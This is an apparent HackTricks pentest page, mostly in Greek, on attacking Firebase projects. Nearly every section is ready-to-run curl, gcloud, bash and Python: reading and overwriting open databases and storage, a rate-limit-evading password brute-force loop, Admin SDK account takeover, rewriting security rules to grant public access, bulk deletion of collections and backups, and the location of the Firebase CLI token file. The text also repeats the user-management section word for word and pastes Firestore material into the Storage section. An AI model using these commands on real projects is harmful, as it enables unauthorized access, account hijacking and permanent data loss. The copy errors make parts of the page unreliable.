# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Ένας επιτιθέμενος δεν απαιτεί συγκεκριμένες άδειες Firebase για να πραγματοποιήσει αυτή την επίθεση. Απαιτείται μόνο μια ευάλωτη ρύθμιση στους κανόνες ασφαλείας του Firebase Realtime Database, όπου οι κανόνες είναι ρυθμισμένοι με `.read: true` ή `.write: true`, επιτρέποντας δημόσια πρόσβαση ανάγνωσης ή εγγραφής.

Ο επιτιθέμενος πρέπει να εντοπίσει το URL της βάσης δεδομένων, που συνήθως ακολουθεί τη μορφή: `https://<project-id>.firebaseio.com/`.

Αυτό το URL μπορεί να βρεθεί μέσω mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), ανάλυσης αρχείων ρυθμίσεων όπως google-services.json (Android) ή GoogleService-Info.plist (iOS), επιθεώρησης του source code των web εφαρμογών, ή εξέτασης του network traffic για να εντοπιστούν αιτήσεις προς domains `*.firebaseio.com`.

Ο επιτιθέμενος εντοπίζει το URL της βάσης δεδομένων και ελέγχει αν είναι δημόσια προσβάσιμο, έπειτα αποκτά πρόσβαση στα δεδομένα και ενδεχομένως γράφει κακόβουλες πληροφορίες.

Πρώτα, ελέγχουν αν η βάση επιτρέπει πρόσβαση ανάγνωσης προσθέτοντας .json στο URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Εάν η απάντηση περιέχει δεδομένα JSON ή null (αντί για "Permission Denied"), η βάση δεδομένων επιτρέπει πρόσβαση ανάγνωσης. Για να ελέγξει την πρόσβαση εγγραφής, ο επιτιθέμενος μπορεί να επιχειρήσει να στείλει ένα δοκιμαστικό αίτημα εγγραφής χρησιμοποιώντας το Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Αν η ενέργεια επιτύχει, η βάση δεδομένων επιτρέπει επίσης πρόσβαση εγγραφής.

### Έκθεση δεδομένων στο Cloud Firestore
Ένας επιτιθέμενος δεν χρειάζεται συγκεκριμένες άδειες Firebase για να πραγματοποιήσει αυτήν την επίθεση. Απαιτείται μόνο να υπάρχει ευάλωτη διαμόρφωση στους κανόνες ασφαλείας του Cloud Firestore όπου οι κανόνες επιτρέπουν ανάγνωση ή εγγραφή χωρίς αυθεντικοποίηση ή με ανεπαρκή επικύρωση. Ένα παράδειγμα λανθασμένα διαμορφωμένου κανόνα που χορηγεί πλήρη πρόσβαση είναι:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Αυτός ο κανόνας επιτρέπει σε οποιονδήποτε να διαβάζει και να γράφει όλα τα documents χωρίς κανέναν περιορισμό. Οι κανόνες του Firestore είναι λεπτομερείς και εφαρμόζονται ανά collection και document, οπότε ένα σφάλμα σε έναν συγκεκριμένο κανόνα μπορεί να εκθέσει μόνο ορισμένες συλλογές.

Ο επιτιθέμενος πρέπει να εντοπίσει το Firebase Project ID, το οποίο μπορεί να βρεθεί μέσω mobile app reverse engineering, ανάλυσης αρχείων ρυθμίσεων όπως google-services.json ή GoogleService-Info.plist, επιθεώρησης του source code των web εφαρμογών, ή ανάλυσης του network traffic για να εντοπιστούν αιτήσεις προς firestore.googleapis.com.
Το Firestore REST API χρησιμοποιεί τη μορφή:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Εάν οι κανόνες επιτρέπουν μη αυθεντικοποιημένη πρόσβαση για ανάγνωση, ο επιτιθέμενος μπορεί να διαβάσει συλλογές και έγγραφα. Πρώτα, επιχειρεί να αποκτήσει πρόσβαση σε μια συγκεκριμένη συλλογή:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Εάν η απάντηση περιέχει JSON documents αντί για permission error, η collection είναι εκτεθειμένη. Ο attacker μπορεί να απαριθμήσει όλες τις προσβάσιμες collections δοκιμάζοντας κοινά ονόματα ή αναλύοντας τη δομή της εφαρμογής. Για να αποκτήσετε πρόσβαση σε ένα συγκεκριμένο document:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Εάν οι κανόνες επιτρέπουν μη αυθεντικοποιημένη πρόσβαση εγγραφής ή έχουν ανεπαρκή επικύρωση, ο επιτιθέμενος μπορεί να δημιουργήσει νέα έγγραφα:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Για να τροποποιήσετε ένα υπάρχον έγγραφο πρέπει να χρησιμοποιήσετε PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Για να διαγράψετε ένα έγγραφο και να προκαλέσετε άρνηση υπηρεσίας:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Έκθεση αρχείων στο Firebase Storage
Ένας επιτιθέμενος δεν χρειάζεται συγκεκριμένα δικαιώματα Firebase για να εκτελέσει αυτήν την επίθεση. Απαιτείται μόνο να υπάρχει ευπαθής διαμόρφωση στους κανόνες ασφαλείας του Firebase Storage όπου οι κανόνες επιτρέπουν πρόσβαση ανάγνωσης ή εγγραφής χωρίς αυθεντικοποίηση ή με ανεπαρκή επικύρωση. Οι κανόνες του Storage ελέγχουν τα δικαιώματα ανάγνωσης και εγγραφής ανεξάρτητα, οπότε ένα σφάλμα σε έναν κανόνα μπορεί να εκθέσει μόνο πρόσβαση ανάγνωσης, μόνο πρόσβαση εγγραφής ή και τα δύο. Ένα παράδειγμα εσφαλμένα διαμορφωμένου κανόνα που παρέχει πλήρη πρόσβαση είναι:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Αυτός ο κανόνας επιτρέπει πρόσβαση ανάγνωσης και εγγραφής σε όλα τα έγγραφα χωρίς οποιονδήποτε περιορισμό. Οι κανόνες του Firestore είναι λεπτομερείς και εφαρμόζονται ανά collection και ανά document, οπότε ένα σφάλμα σε έναν συγκεκριμένο κανόνα μπορεί να εκθέσει μόνο ορισμένες συλλογές. Ο επιτιθέμενος πρέπει να εντοπίσει το Firebase Project ID, το οποίο μπορεί να βρεθεί μέσω mobile application reverse engineering, ανάλυσης αρχείων διαμόρφωσης όπως google-services.json ή GoogleService-Info.plist, επιθεώρησης του πηγαίου κώδικα της web εφαρμογής, ή ανάλυσης δικτύου για να εντοπιστούν requests προς firestore.googleapis.com.

Το Firestore REST API χρησιμοποιεί το format: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

If the rules allow unauthenticated read access, the attacker can read collections and documents. First, they attempt to access a specific collection.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Εάν η απάντηση περιέχει τη λίστα αρχείων αντί για σφάλμα δικαιωμάτων, το αρχείο είναι εκτεθειμένο. Ο επιτιθέμενος μπορεί να δει τα περιεχόμενα των αρχείων καθορίζοντας τη διαδρομή τους:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Εάν οι κανόνες επιτρέπουν μη αυθεντικοποιημένη πρόσβαση εγγραφής ή έχουν ανεπαρκή επικύρωση, ο επιτιθέμενος μπορεί να ανεβάσει κακόβουλα αρχεία. Για να ανεβάσετε ένα αρχείο μέσω του REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Ο επιτιθέμενος μπορεί να ανεβάσει code shells, malware payloads ή μεγάλα αρχεία για να προκαλέσει denial of service. Εάν η εφαρμογή επεξεργάζεται ή εκτελεί τα ανεβασμένα αρχεία, ο επιτιθέμενος μπορεί να πετύχει remote code execution. Για να διαγράψει αρχεία και να προκαλέσει denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Κλήση δημόσιων Firebase Cloud Functions
Ένας επιτιθέμενος δεν χρειάζεται συγκεκριμένα δικαιώματα Firebase για να εκμεταλλευτεί αυτό το ζήτημα· αρκεί η Cloud Function να είναι δημόσια προσβάσιμη μέσω HTTP χωρίς authentication.

A function is vulnerable when it is insecurely configured:

- Χρησιμοποιεί functions.https.onRequest, το οποίο δεν επιβάλλει authentication (σε αντίθεση με onCall functions).
- Ο κώδικας της function δεν επαληθεύει την authentication του χρήστη (π.χ. δεν υπάρχουν έλεγχοι για request.auth ή context.auth).
- Η function είναι δημόσια προσβάσιμη στο IAM, δηλαδή allUsers έχει τον ρόλο roles/cloudfunctions.invoker. Αυτή είναι η default συμπεριφορά για HTTP functions εκτός αν ο developer περιορίσει την πρόσβαση.

Firebase HTTP Cloud Functions are exposed through URLs such as:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Ένας επιτιθέμενος μπορεί να ανακαλύψει αυτά τα URLs μέσω source code analysis, network traffic inspection, enumeration tools, ή mobile app reverse engineering.
Αν η function είναι δημόσια εκτεθειμένη και unauthenticated, ο επιτιθέμενος μπορεί να την invoke απευθείας χωρίς credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Εάν η συνάρτηση δεν επικυρώνει σωστά τις εισόδους, ο επιτιθέμενος μπορεί να επιχειρήσει άλλες επιθέσεις όπως code injection ή command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
Ένας επιτιθέμενος δεν χρειάζεται συγκεκριμένα δικαιώματα Firebase για να πραγματοποιήσει αυτή την επίθεση. Αρκεί το Firebase API Key να είναι εκτεθειμένο σε mobile ή web εφαρμογές, και η πολιτική κωδικών να μην έχει διαμορφωθεί με αυστηρότερες απαιτήσεις από τις προεπιλογές.

Ο επιτιθέμενος πρέπει να εντοπίσει το Firebase API Key, το οποίο μπορεί να βρεθεί μέσω mobile app reverse engineering, ανάλυσης αρχείων ρυθμίσεων όπως google-services.json ή GoogleService-Info.plist, επιθεώρησης του source code των web εφαρμογών (π.χ., στο bootstrap.js), ή ανάλυσης της δικτυακής κίνησης.

Το REST API του Firebase Authentication χρησιμοποιεί το endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
για να αυθεντικοποιηθεί με email και κωδικό.

Εάν η προστασία εντοπισμού email (Email Enumeration Protection) είναι απενεργοποιημένη, οι απαντήσεις σφάλματος του API μπορούν να αποκαλύψουν εάν ένα email υπάρχει στο σύστημα (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), επιτρέποντας στους επιτιθέμενους να απαριθμήσουν χρήστες πριν επιχειρήσουν μαντεψιές κωδικών. Όταν αυτή η προστασία είναι ενεργοποιημένη, το API επιστρέφει το ίδιο μήνυμα σφάλματος τόσο για μη υπαρκτά emails όσο και για λανθασμένους κωδικούς, αποτρέποντας την απαρίθμηση χρηστών.

Σημαντικό είναι ότι το Firebase Authentication επιβάλλει rate limiting, το οποίο μπορεί να μπλοκάρει αιτήσεις αν γίνουν πάρα πολλές προσπάθειες authentication σε σύντομο χρονικό διάστημα. Εξαιτίας αυτού, ο επιτιθέμενος θα πρέπει να εισάγει καθυστερήσεις μεταξύ των προσπαθειών για να αποφύγει το rate-limiting.

Ο επιτιθέμενος εντοπίζει το API Key και πραγματοποιεί προσπάθειες authentication με πολλούς κωδικούς σε γνωστούς λογαριασμούς. Εάν η Email Enumeration Protection είναι απενεργοποιημένη, ο επιτιθέμενος μπορεί να απαριθμήσει υπάρχοντες χρήστες αναλύοντας τις απαντήσεις σφάλματος:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Αν η απάντηση περιέχει EMAIL_NOT_FOUND, το email δεν υπάρχει στο σύστημα. Αν περιέχει INVALID_PASSWORD, το email υπάρχει αλλά ο κωδικός είναι λανθασμένος, επιβεβαιώνοντας ότι ο χρήστης είναι εγγεγραμμένος. Μόλις εντοπιστεί ένας έγκυρος χρήστης, ο attacker μπορεί να εκτελέσει brute-force attempts. Είναι σημαντικό να περιληφθούν παύσεις μεταξύ των προσπαθειών για να αποφευχθούν οι rate-limiting mechanisms του Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Με την προεπιλεγμένη πολιτική κωδικών (ελάχιστο 6 χαρακτήρες, χωρίς απαιτήσεις πολυπλοκότητας), ο επιτιθέμενος μπορεί να δοκιμάσει όλους τους δυνατούς συνδυασμούς 6-ψήφιων κωδικών, κάτι που αντιπροσωπεύει έναν σχετικά μικρό χώρο αναζήτησης σε σύγκριση με αυστηρότερες πολιτικές κωδικών.

### Διαχείριση χρηστών στο Firebase Authentication

Ο επιτιθέμενος χρειάζεται συγκεκριμένα δικαιώματα του Firebase Authentication για να πραγματοποιήσει αυτή την επίθεση. Τα απαιτούμενα δικαιώματα είναι:

- `firebaseauth.users.create` για τη δημιουργία χρηστών
- `firebaseauth.users.update` για την τροποποίηση υπαρχόντων χρηστών
- `firebaseauth.users.delete` για τη διαγραφή χρηστών
- `firebaseauth.users.get` για την ανάκτηση πληροφοριών χρήστη
- `firebaseauth.users.sendEmail` για την αποστολή email σε χρήστες
- `firebaseauth.users.createSession` για τη δημιουργία συνεδριών χρηστών

Αυτά τα δικαιώματα περιλαμβάνονται στο ρόλο `roles/firebaseauth.admin`, που παρέχει πλήρη πρόσβαση ανάγνωσης/εγγραφής στους πόρους του Firebase Authentication. Περιλαμβάνονται επίσης σε υψηλότερου επιπέδου ρόλους όπως roles/firebase.developAdmin (που περιλαμβάνει όλα τα firebaseauth.* δικαιώματα) και roles/firebase.admin (πλήρης πρόσβαση σε όλες τις υπηρεσίες Firebase).

Για να χρησιμοποιήσει το Firebase Admin SDK, ο επιτιθέμενος θα χρειαστεί πρόσβαση σε διαπιστευτήρια service account (JSON αρχείο), τα οποία μπορεί να βρεθούν σε παραβιασμένα συστήματα, δημόσια εκτεθειμένα αποθετήρια κώδικα, παραβιασμένα συστήματα CI/CD, ή μέσω της παραβίασης λογαριασμών developer που έχουν πρόσβαση σε αυτά τα διαπιστευτήρια.

Το πρώτο βήμα είναι να διαμορφώσετε το Firebase Admin SDK χρησιμοποιώντας διαπιστευτήρια service account.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Για να δημιουργήσει έναν κακόβουλο χρήστη χρησιμοποιώντας τη διεύθυνση email του θύματος, ο επιτιθέμενος θα επιχειρούσε να χρησιμοποιήσει το Firebase Admin SDK για να δημιουργήσει έναν νέο λογαριασμό με αυτή τη διεύθυνση.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Για να τροποποιήσει έναν υπάρχοντα χρήστη, ο επιτιθέμενος θα ενημέρωνε πεδία όπως η διεύθυνση email, η κατάσταση επαλήθευσης ή εάν ο λογαριασμός είναι απενεργοποιημένος.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Για να διαγράψει έναν λογαριασμό χρήστη και να προκαλέσει ένα denial of service, ο επιτιθέμενος θα στείλει ένα αίτημα για να αφαιρέσει εντελώς τον χρήστη.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Ο επιτιθέμενος μπορεί επίσης να ανακτήσει πληροφορίες για υπάρχοντες χρήστες ζητώντας το UID ή τη διεύθυνση email τους.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Επιπλέον, ο επιτιθέμενος θα μπορούσε να δημιουργήσει συνδέσμους επιβεβαίωσης ή συνδέσμους επαναφοράς κωδικού πρόσβασης προκειμένου να αλλάξει τον κωδικό ενός χρήστη και να αποκτήσει πρόσβαση στον λογαριασμό του.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Διαχείριση χρηστών στο Firebase Authentication
Ένας επιτιθέμενος χρειάζεται συγκεκριμένες άδειες του Firebase Authentication για να εκτελέσει αυτήν την επίθεση. Οι απαιτούμενες άδειες είναι:

- `firebaseauth.users.create` για τη δημιουργία χρηστών
- `firebaseauth.users.update` για την τροποποίηση υπαρχόντων χρηστών
- `firebaseauth.users.delete` για τη διαγραφή χρηστών
- `firebaseauth.users.get` για την απόκτηση πληροφοριών χρηστών
- `firebaseauth.users.sendEmail` για την αποστολή email σε χρήστες
- `firebaseauth.users.createSession` για τη δημιουργία συνεδριών χρηστών

Αυτές οι άδειες περιλαμβάνονται στο ρόλο roles/firebaseauth.admin, ο οποίος παρέχει πλήρη πρόσβαση ανάγνωσης/εγγραφής στους πόρους του Firebase Authentication. Επίσης αποτελούν μέρος ανώτερων ρόλων όπως `roles/firebase.developAdmin` (που περιλαμβάνει όλες τις άδειες firebaseauth.*) και `roles/firebase.admin` (πλήρης πρόσβαση σε όλες τις υπηρεσίες Firebase).

Για να χρησιμοποιήσει το Firebase Admin SDK, ο επιτιθέμενος θα χρειαστεί πρόσβαση σε διαπιστευτήρια service account (ένα αρχείο JSON), τα οποία μπορούν να αποκτηθούν από παραβιασμένα συστήματα, δημόσια εκτεθειμένα αποθετήρια κώδικα, παραβιασμένα περιβάλλοντα CI/CD, ή μέσω της παραβίασης λογαριασμών προγραμματιστών που έχουν πρόσβαση σε αυτά τα διαπιστευτήρια.

Το πρώτο βήμα είναι να διαμορφώσετε το Firebase Admin SDK χρησιμοποιώντας τα διαπιστευτήρια service account.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Για να δημιουργήσει έναν κακόβουλο χρήστη χρησιμοποιώντας το email του θύματος, ο επιτιθέμενος θα επιχειρούσε να δημιουργήσει νέο λογαριασμό χρήστη με αυτό το email, εκχωρώντας τον δικό του κωδικό πρόσβασης και πληροφορίες προφίλ.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Για να τροποποιήσει έναν υπάρχοντα χρήστη, ο attacker θα άλλαζε πεδία όπως η διεύθυνση email, η κατάσταση επαλήθευσης ή το αν ο λογαριασμός είναι απενεργοποιημένος.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Για να διαγράψει έναν λογαριασμό χρήστη — προκαλώντας ουσιαστικά άρνηση υπηρεσίας — ο επιτιθέμενος θα στείλει ένα αίτημα για τη μόνιμη διαγραφή αυτού του χρήστη.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Ο attacker θα μπορούσε επίσης να ανακτήσει πληροφορίες για υπάρχοντες χρήστες, όπως το UID ή το email, ζητώντας λεπτομέρειες χρήστη είτε με το UID είτε με τη διεύθυνση email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Επιπλέον, ο επιτιθέμενος θα μπορούσε να δημιουργήσει συνδέσμους επαλήθευσης ή συνδέσμους επαναφοράς κωδικού, επιτρέποντάς του να αλλάξει τον κωδικό ενός χρήστη και να αναλάβει τον έλεγχο του λογαριασμού.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Τροποποίηση κανόνων ασφάλειας στις υπηρεσίες Firebase
Ο επιτιθέμενος χρειάζεται συγκεκριμένες άδειες για να τροποποιήσει τους κανόνες ασφάλειας ανάλογα με την υπηρεσία. Για το Cloud Firestore και το Firebase Cloud Storage, οι απαιτούμενες άδειες είναι `firebaserules.rulesets.create` για τη δημιουργία rulesets και `firebaserules.releases.create` για την ανάπτυξη releases. Αυτές οι άδειες περιλαμβάνονται στον ρόλο `roles/firebaserules.admin` ή σε ρόλους υψηλότερου επιπέδου όπως οι `roles/firebase.developAdmin` και `roles/firebase.admin`. Για το Firebase Realtime Database, η απαιτούμενη άδεια είναι `firebasedatabase.instances.update`.

Ο επιτιθέμενος πρέπει να χρησιμοποιήσει το Firebase REST API για να τροποποιήσει τους κανόνες ασφάλειας. Πρώτα, ο επιτιθέμενος θα χρειαστεί να αποκτήσει ένα access token χρησιμοποιώντας service account credentials. Για να αποκτήσει το token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Για να τροποποιήσετε τους κανόνες του Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Για να τροποποιήσει τους κανόνες του Cloud Firestore, ο attacker πρέπει να δημιουργήσει ένα ruleset και στη συνέχεια να το deploy:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Η προηγούμενη εντολή επιστρέφει ένα όνομα ruleset με τη μορφή projects/<project-id>/rulesets/<ruleset-id>. Για να αναπτυχθεί η νέα έκδοση, το release πρέπει να ενημερωθεί χρησιμοποιώντας ένα PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Για να τροποποιήσετε τους κανόνες του Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Η προηγούμενη εντολή επιστρέφει ένα όνομα ruleset στη μορφή projects/<project-id>/rulesets/<ruleset-id>. Για να αναπτυχθεί η νέα έκδοση, το release πρέπει να ενημερωθεί χρησιμοποιώντας ένα PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Εξαγωγή και χειρισμός δεδομένων στο Cloud Firestore
Το Cloud Firestore χρησιμοποιεί την ίδια υποδομή και σύστημα δικαιωμάτων με το Cloud Datastore, οπότε τα Datastore IAM permissions εφαρμόζονται απευθείας στο Firestore. Για να χειριστεί κάποιος TTL πολιτικές απαιτείται το δικαίωμα `datastore.indexes.update`. Για εξαγωγή δεδομένων απαιτείται το δικαίωμα `datastore.databases.export`. Για εισαγωγή δεδομένων απαιτείται το δικαίωμα `datastore.databases.import`. Για μαζική διαγραφή δεδομένων απαιτείται το δικαίωμα `datastore.databases.bulkDelete`.

Για λειτουργίες backup και restore απαιτούνται συγκεκριμένα δικαιώματα:

- `datastore.backups.get` και `datastore.backups.list` για την απαρίθμηση και ανάκτηση λεπτομερειών των διαθέσιμων backups
- `datastore.backups.delete` για διαγραφή backups
- `datastore.backups.restoreDatabase` για επαναφορά βάσης δεδομένων από backup
- `datastore.backupSchedules.create` και `datastore.backupSchedules.delete` για διαχείριση προγραμμάτων backup

Όταν δημιουργείται μια πολιτική TTL, επιλέγεται μια ιδιότητα για να προσδιορίζει τις οντότητες που είναι επιλέξιμες για διαγραφή. Αυτή η TTL ιδιότητα πρέπει να είναι του τύπου Ημερομηνία και ώρα. Ο επιτιθέμενος μπορεί να επιλέξει μια ιδιότητα που υπάρχει ήδη ή να καθορίσει μια ιδιότητα που σκοπεύει να προσθέσει αργότερα. Εάν η τιμή του πεδίου είναι ημερομηνία στο παρελθόν, το έγγραφο γίνεται επιλέξιμο για άμεση διαγραφή. Ο επιτιθέμενος μπορεί να χρησιμοποιήσει το gcloud CLI για να χειριστεί τις πολιτικές TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Για να εξάγει δεδομένα και να τα αποσπάσει, ο επιτιθέμενος θα μπορούσε να χρησιμοποιήσει το gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Για να εισάγετε κακόβουλα δεδομένα:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Για να πραγματοποιήσει μαζική διαγραφή δεδομένων και να προκαλέσει denial of service, ο επιτιθέμενος θα μπορούσε να χρησιμοποιήσει το gcloud Firestore bulk-delete tool για να αφαιρέσει ολόκληρες συλλογές.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Για λειτουργίες backup και επαναφοράς, ο επιτιθέμενος θα μπορούσε να δημιουργήσει scheduled backups για να καταγράψει την τρέχουσα κατάσταση της βάσης δεδομένων, να απαριθμήσει τα υπάρχοντα backups, να επαναφέρει από ένα backup για να αντικαταστήσει πρόσφατες αλλαγές, να διαγράψει backups προκαλώντας μόνιμη απώλεια δεδομένων και να αφαιρέσει scheduled backups.
Για να δημιουργήσετε ένα ημερήσιο backup schedule που θα δημιουργεί αμέσως ένα backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Για να επαναφέρει από ένα συγκεκριμένο αντίγραφο ασφαλείας, ο επιτιθέμενος θα μπορούσε να δημιουργήσει μια νέα βάση δεδομένων χρησιμοποιώντας τα δεδομένα που περιέχονται σε εκείνο το αντίγραφο ασφαλείας. Η λειτουργία επαναφοράς εγγράφει τα δεδομένα του αντιγράφου ασφαλείας σε μια νέα βάση δεδομένων, πράγμα που σημαίνει ότι ένα υπάρχον DATABASE_ID δεν μπορεί να χρησιμοποιηθεί.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Για να διαγράψετε ένα backup και να προκαλέσετε μόνιμη απώλεια δεδομένων:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Κλοπή και κατάχρηση των διαπιστευτηρίων του Firebase CLI
Ένας επιτιθέμενος δεν χρειάζεται συγκεκριμένα δικαιώματα Firebase για να πραγματοποιήσει αυτή την επίθεση, αλλά χρειάζεται πρόσβαση στο τοπικό σύστημα του προγραμματιστή ή στο αρχείο διαπιστευτηρίων του Firebase CLI. Αυτά τα διαπιστευτήρια αποθηκεύονται σε ένα αρχείο JSON που βρίσκεται στο:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Αυτό το αρχείο περιέχει διακριτικά αυθεντικοποίησης, συμπεριλαμβανομένων των refresh_token και access_token, τα οποία επιτρέπουν στον επιτιθέμενο να αυθεντικοποιηθεί ως ο χρήστης που αρχικά εκτέλεσε firebase login.

